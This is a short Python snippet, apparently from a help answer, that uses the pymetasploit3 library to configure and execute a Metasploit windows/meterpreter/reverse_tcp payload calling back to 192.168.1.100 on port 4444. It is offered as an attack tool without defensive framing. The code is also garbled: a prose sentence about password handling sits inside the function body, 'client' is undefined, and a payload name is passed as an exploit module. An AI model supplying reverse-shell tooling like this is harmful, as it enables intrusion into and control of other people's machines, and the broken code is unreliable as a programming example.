Install pymetasploit3 using pip: pip install pymetasploit3

def generate_metasploit_payload(payload_type, lhost, lport):
    Consider reading the password from an environment variable or a secure configuration file.
    exploit = client.modules.use('exploit', payload_type)
    exploit['LHOST'] = lhost
    exploit['LPORT'] = lport
    return exploit.execute()

if __name__ == "__main__":
    payload = generate_metasploit_payload("windows/meterpreter/reverse_tcp", "192.168.1.100", 4444)
    print(payload)